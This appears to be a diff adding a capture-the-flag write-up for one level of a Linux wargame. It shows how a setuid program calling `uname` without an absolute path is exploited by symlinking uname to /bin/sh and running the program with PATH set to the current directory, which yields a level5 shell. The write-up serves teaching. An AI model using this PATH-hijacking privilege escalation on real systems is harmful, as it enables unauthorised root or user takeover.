@@ -1,0 +1,30 @@
+In this level you had to exploit the fact, that if no absolute path is specified,
+the system searches in the $PATH locations for it. Because the setuid binary
+didn't use absoliute paths, it was possible to change the environment $PATH
+variable. One of the first commands executed is `uname`. So we use a symlink
+called uname to `/bin/sh`.
+
+    ln -s /bin/sh uname
+
+If we now set $PATH only to the current working directory "." the system will
+search for the `uname` program and will only find the symlink. So it will execute
+the shell for us.
+
+    level4@gracker:/tmp/level4$ echo $PATH
+    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+
+    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
+    Zero Cool - Linux Information Gathering Tool v1.2
+
+    [*] Get system information:
+    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+    $ id
+    uid=1005(level5) gid=1004(level4) groups=1004(level4)
+
+Because the $PATH is now screwed, we have to reset it back to the original value,
+otherwise no other commands will work.
+
+This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
+but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
+Read this paper for more details:
+https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
